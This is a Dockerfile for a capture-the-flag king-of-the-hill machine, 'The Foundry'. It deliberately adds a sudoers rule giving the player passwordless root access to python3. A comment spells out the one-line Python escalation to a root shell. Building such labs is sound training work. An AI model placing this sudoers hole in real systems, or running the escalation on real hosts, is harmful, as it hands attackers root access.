# ctf-koth-boot2root-foundry:latest -- boot2root KotH hill #2 "The Foundry".
# Privesc: sudo NOPASSWD on python3 (GTFOBins). `sudo python3 -c 'import os;
# os.setuid(0); os.system("bash")'` -> root shell -> write /root/king.txt.
FROM ctf-koth-boot2root-base:latest
RUN echo 'player ALL=(root) NOPASSWD: /usr/bin/python3' > /etc/sudoers.d/foundry \
 && chmod 0440 /etc/sudoers.d/foundry \
 && visudo -cf /etc/sudoers.d/foundry
